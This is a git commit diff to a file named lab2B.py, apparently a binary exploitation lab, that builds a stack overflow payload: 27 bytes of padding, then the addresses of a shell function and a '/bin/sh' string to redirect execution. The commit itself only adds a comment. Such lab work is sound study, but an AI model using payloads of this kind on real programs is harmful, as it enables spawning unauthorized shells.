2b52f12a93ecfae181fea166ca123221036cf4ec
Jalynk2004 <81233886+Jalynk2004@users.noreply.github.com>
2022-12-19 21:30:31 +0700

    Update lab2B.py

--- lab02/lab2B.py
+++ lab02/lab2B.py
@@ -1,6 +1,6 @@
   1 import struct
   2
-  3 payload = 'A'*27
+  3 payload = 'A'*27 #offset to return address
   4 payload += struct.pack('I', 0x080486bd) #shell address
   5 payload += '0'*4 #return parameter
   6 payload += struct.pack('I', 0x080487d0) #binsh address
